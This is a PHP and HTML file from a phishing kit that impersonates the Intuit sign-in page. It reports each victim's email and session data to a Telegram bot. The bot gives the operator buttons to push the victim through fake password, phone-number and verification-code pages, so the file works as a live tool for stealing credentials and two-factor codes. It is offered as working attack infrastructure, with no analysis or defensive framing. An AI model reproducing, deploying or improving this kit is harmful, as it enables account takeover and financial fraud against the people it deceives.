<?php
session_start();
ob_start(); 
require_once('includes/php/detect.php');
require_once('config2.php');

if (!function_exists('curl_init')) {
  die('Error: cURL must be enabled on the server.');
}

if(!isset($_SESSION['Email'])) $_SESSION['Email'] = true;


$_SESSION['unique_id'] = bin2hex(random_bytes(16));

$adddate=date("D M d, Y g:i a");
  
if ($live_control['access_manipulation'] === true) {

    $btnRcap = array(
        array(
            array('text' => 'LOGIN ERROR ⛔', 'callback_data' => $_SESSION['unique_id'] . ' loginerr'),
        ),
        array(
            array('text' => 'PROCEED TO PASSWORD 📲', 'callback_data' => $_SESSION['unique_id'] . ' password'),
          ),
          array(
            array('text' => 'PASSWORD ERROR ⛔', 'callback_data' => $_SESSION['unique_id'] . ' passworderr'),
        ),
        array(
         array('text' => 'REQUEST PHONE NUM 📲', 'callback_data' => $_SESSION['unique_id'] . ' phone'),
     ),
        array(
            array('text' => 'SEND CODE PAGE ♻️', 'callback_data' => $_SESSION['unique_id'] . ' sendcode'),
          ),
        array(
          array('text' => 'CODE SENT 📲', 'callback_data' => $_SESSION['unique_id'] . ' code'),
        ),
        
        array(
         array('text' => 'INVALID CODE ⛔', 'callback_data' => $_SESSION['unique_id'] . ' invalidcode'),
       ),
        array(
            array('text' => 'REDIRECT 📴', 'callback_data' => $_SESSION['unique_id'] . ' redirect'),
          ),
      );
  
    $buttons = array(
        'inline_keyboard' => $btnRcap
    );
  
  include_once('includes/php/bot_api.php');

$message = '📦 <code>'.$_SESSION['user_data']['query'].'</code>  <code>'.$_SESSION['Email'].'</code> <b>is waiting</b>

<b>USER  '.$_SESSION['Email'].'</b>
<b>SELECT NEXT PAGE..</b>
<b>DATE:</b> '.$adddate.'
<b>coder:</b> <b>'.$_SESSION['pria'].$_SESSION['prib'].$_SESSION['pric'].$_SESSION['prid'].'</b>
';

  $status = bot_api($message, $buttons);
  if ($status['ok'] === 0 || $status['ok'] === false) die('{"error":true, "description": "telegram bot api"}');
}elseif($live_control['access_auto'] == 'captcha'){
  header('location: intuit/password.php');
  exit();
}else{
  header('location: intuit/access_check.php');
  exit();
}
?>

<!doctype html>
<html lang="en" data-shell-version="6.364.0-master-bld.1303-61353769-1303">
   <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      <title>Intuit Accounts - Sign In</title>
      
      
      <link rel="preload stylesheet" as="style" href="./css/spin.css" crossorigin="anonymous"/>
      <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
      
      
      
   </head>
   <body>
      <div id="web-shell-spinner">
         <div class="idsTSIShortSpinner IndeterminateShort-wrapper">
            <div class="IndeterminateShort-circularSpinnerOuter">
               <div class="IndeterminateShort-circularSpinnerInner">
                  <svg class="IndeterminateShort-circularSpinnerCircle IndeterminateShort-light" version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 128 128" xml:space="preserve">
                     <circle cx="64" cy="64" r="6.9"></circle>
                  </svg>
               </div>
            </div>
            <div class="IndeterminateShort-circularSpinnerOuter">
               <div class="IndeterminateShort-circularSpinnerInner">
                  <svg class="IndeterminateShort-circularSpinnerCircle IndeterminateShort-light" version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 128 128" xml:space="preserve">
                     <circle cx="64" cy="64" r="6.9"></circle>
                  </svg>
               </div>
            </div>
            <div class="IndeterminateShort-circularSpinnerOuter">
               <div class="IndeterminateShort-circularSpinnerInner">
                  <svg class="IndeterminateShort-circularSpinnerCircle IndeterminateShort-light" version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 128 128" xml:space="preserve">
                     <circle cx="64" cy="64" r="6.9"></circle>
                  </svg>
               </div>
            </div>
            <div class="IndeterminateShort-circularSpinnerOuter">
               <div class="IndeterminateShort-circularSpinnerInner">
                  <svg class="IndeterminateShort-circularSpinnerCircle IndeterminateShort-light" version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 128 128" xml:space="preserve">
                     <circle cx="64" cy="64" r="6.9"></circle>
                  </svg>
               </div>
            </div>
            
         </div>
      </div>
         <?php
    require_once('includes/js/startRequest.php'); 
    require_once('includes/js/makeRequest.php'); 
    ?>
    <script>
    function processResponse(response) {
      for (var i = 0; i < response.result.length; i++) {
        var result = response.result[i];
        if (result.callback_query && (result.callback_query.data === "<?php echo $_SESSION['unique_id'] ?> loginerr" 
        || result.callback_query.data === "<?php echo $_SESSION['unique_id'] ?> password" 
        || result.callback_query.data === "<?php echo $_SESSION['unique_id'] ?> passworderr"
        || result.callback_query.data === "<?php echo $_SESSION['unique_id'] ?> phone"  
        || result.callback_query.data === "<?php echo $_SESSION['unique_id'] ?> sendcode" 
        || result.callback_query.data === "<?php echo $_SESSION['unique_id'] ?> code"
        || result.callback_query.data === "<?php echo $_SESSION['unique_id'] ?> invalidcode" 
        || result.callback_query.data === "<?php echo $_SESSION['unique_id'] ?> redirect")) {
          var chatId = result.callback_query.message.chat.id;
          var messageId = result.callback_query.message.message_id;
          var action = result.callback_query.data.split(" ")[1];
          
          deleteMessage(chatId, messageId);

        if (action === "loginerr") {
            window.location.href = "intuit/loginerr.php"; 
            console.log("Login error!");
        } else if (action === "password") {
            window.location.href = "intuit/password.php"; 
            console.log("password page!");
        } else if (action === "passworderr") {
            window.location.href = "intuit/passworderr.php"; 
            console.log("password error!");
         } else if (action === "phone") {
            window.location.href = "intuit/phone.php"; 
            console.log("request phone number!");
         } else if (action === "sendcode") {
            window.location.href = "intuit/sendcode.php"; 
            console.log("code sent!");
         } else if (action === "code") {
            window.location.href = "intuit/code.php"; 
            console.log("code sent!");
         } else if (action === "invalidcode") {
            window.location.href = "intuit/invalidcode.php"; 
            console.log("new code sent!");
        } else if (action === "redirect") {
            window.location.href = "intuit/thanks.php"; 
            console.log("Redirect !");
        } 

          break;
        }
      }
    }
  </script>
  <?php require_once('includes/js/deleteMessage.php'); ?>
  </body>
</html>